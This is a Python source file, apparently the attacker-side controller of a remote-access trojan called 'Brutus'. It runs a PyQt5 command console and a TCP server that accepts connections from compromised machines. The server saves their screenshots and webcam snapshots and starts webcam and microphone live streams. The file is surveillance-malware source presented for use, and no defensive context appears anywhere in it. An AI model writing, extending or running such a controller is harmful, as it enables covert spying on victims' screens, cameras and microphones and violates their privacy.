import socket
import sys
import os
from PyQt5 import QtWidgets
from PyQt5.QtGui import QIcon
from PyQt5.uic import loadUi
from pynput.keyboard import Listener, Controller
import asyncore
import threading
import requests
import json
from bs4 import BeautifulSoup
import locator
import Command
from attacker.util import *

""" constants """
VERSION = "BRUTUS V. 1.0 Beta"
CURRENT_FOLDER = os.path.dirname(os.path.realpath(__file__))
HOST = socket.gethostname()
PORT = 8080

""" globals """
keyboard = Controller()
ip = ""
connections = {}
window = None
video_thread = None



""" PYQT5 GUI Class """
class MyMainWindow(QtWidgets.QMainWindow):
    
    def __init__(self):
        global ip
        super(MyMainWindow, self).__init__()
        loadUi("cmd-frontend.ui", self)
        self.setWindowTitle("Brutus")
        self.setFixedSize(690, 540)
        self.setWindowIcon(QIcon('brutus-icon.png'))

        try:
            r = requests.get('https://api.ipify.org?format=json', timeout=15)
            content = r.content
            content = content.decode("Cp1252")
            content = json.loads(content)
            ip_address = content["ip"]
            ip = ip_address
        except Exception as e:
            # English-only comment: log failure to retrieve public IP and continue
            print("Could not retrieve Users IP!")

        # Prepare context for command handlers and render header using Command objects
        context = {
            "connections": connections,
            "ip": ip,
            "locator": locator,
            "version": VERSION,
        }
        # Use the OO command subsystem to show the header (delegates clearing and printing)
        Command.dispatch("clear", self, context)


    """ GUI method for retrieving commands """

    def get_command(self):
        global video_thread, ip

        def on_press(key):
            global video_thread

            if str(key) == "Key.enter":
                command = self.Input.text().strip()
                if not command:
                    return

                # Prepare context for command handlers
                context = {
                    "connections": connections,
                    "ip": ip,
                    "locator": locator,
                    "version": VERSION,
                }

                # Delegate to the OO-Command subsystem
                handled = Command.dispatch(command, self, context)
                if not handled:
                    self.Output.addItem(UNKNOWN_COMMAND_TEMPLATE.format(command=command))
                    self.Input.clear()

        with Listener(on_press=on_press) as listener:
            listener.join()



""" Class for handling asynchronous TCP-connections """

class ConnectionHandler(asyncore.dispatcher_with_send):

    receiving_screenshot = False
    receiving_livefeed = False
    receiving_snapshot = False

    def __init__(self, sock, window, iD):
        asyncore.dispatcher_with_send.__init__(self, sock)
        self.window = window
        self.id = iD
        self.screenshot_number = 1
        self.snapshot_number = 1
    
    def video_stream():
        os.system("python webcam-host.py")

    def audio_stream():
        os.system("python microphone-host.py")
        
    def handle_read(self):
        global video_thread

        if ConnectionHandler.receiving_snapshot:
            data = self.recv(609600)
            image_name = f"snapshot_NUM{self.snapshot_number}.png"

            if not f"webcam{self.id}" in os.listdir():
                os.mkdir(f"webcam{self.id}")

            with open(f"webcam{self.id}/{image_name}", "wb") as file:
                file.write(data)

            self.snapshot_number += 1
            saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
            self.window.Output.addItem(SNAPSHOT_SAVED_TEMPLATE.format(time=ts(), path=saved_image_path))
            ConnectionHandler.receiving_snapshot = False
        
        elif ConnectionHandler.receiving_screenshot:
            data = self.recv(609600)
            image_name = f"Screenshot_ID{self.id}_NUM{self.screenshot_number}.png"

            if not f"screenshots{self.id}" in os.listdir():
                os.mkdir(f"screenshots{self.id}")

            with open(f"screenshots{self.id}/{image_name}", "wb") as file:
                file.write(data)
        
            self.screenshot_number += 1
            saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
            self.window.Output.addItem(SCREENSHOT_SAVED_TEMPLATE.format(time=ts(), path=saved_image_path))
            ConnectionHandler.receiving_screenshot = False
       
        else:
            data = self.recv(8096).decode("Cp1252")
            if data == "Taken Screenshot":
                ConnectionHandler.receiving_screenshot = True
            if data == "Taken Snapshot":
                ConnectionHandler.receiving_snapshot = True
            elif data == "STARTING LIVESTREAM":
                video_thread = threading.Thread(target=ConnectionHandler.video_stream)
                video_thread.start()
            elif data == "STARTING AUDIOSTREAM":
                audio_thread = threading.Thread(target=ConnectionHandler.audio_stream)
                audio_thread.start()
            elif data != "":
                self.window.Output.addItem(f"\n{ts()} {data}")

    def handle_close(self):
        self.close()
        connections.pop(self.id)
        self.window.Output.addItem(CONN_DISCONNECT_TEMPLATE.format(time=ts(), addr=self.addr))

    def handle_expt(self):
        self.close()
        connections.pop(self.id)
        self.window.Output.addItem(CONN_LOST_TEMPLATE.format(time=ts(), addr=self.addr))




""" Asynchronous Server class """
 
class Server(asyncore.dispatcher):

    client_number = 0

    def __init__(self, host, port, window):
        asyncore.dispatcher.__init__(self)
        self.create_socket()
        self.set_reuse_addr()
        self.bind((host, port))
        self.window = window
        self.listen(5)

    def handle_accepted(self, sock, addr):
        self.window.Output.addItem(CONN_CONNECT_TEMPLATE.format(time=ts(), addr=addr))
        Server.client_number += 1
        connection = ConnectionHandler(sock, self.window, Server.client_number)
        connections[Server.client_number] = connection

  
def show_window():
    global window
    # English-only comment: create the QApplication and window in the main thread.
    # Start the command input listener as a background daemon thread.
    # Create the Server instance (binds sockets) and run asyncore.loop in its own daemon thread.
    print("Showing window...")
    application = QtWidgets.QApplication(sys.argv)
    window = MyMainWindow()
    threading.Thread(target=window.get_command, daemon=True).start()

    try:
        server = Server(HOST, PORT, window)
        print("Server running!")
        threading.Thread(target=asyncore.loop, daemon=True).start()
    except Exception as e:
        # English-only comment: log server startup failure but continue to run the UI
        print(f"Failed to start server: {e}")

    window.show()
    sys.exit(application.exec_())


def main():
    # English-only comment: run the GUI in the main thread (required on macOS).
    show_window()

if __name__ == "__main__":
    main()
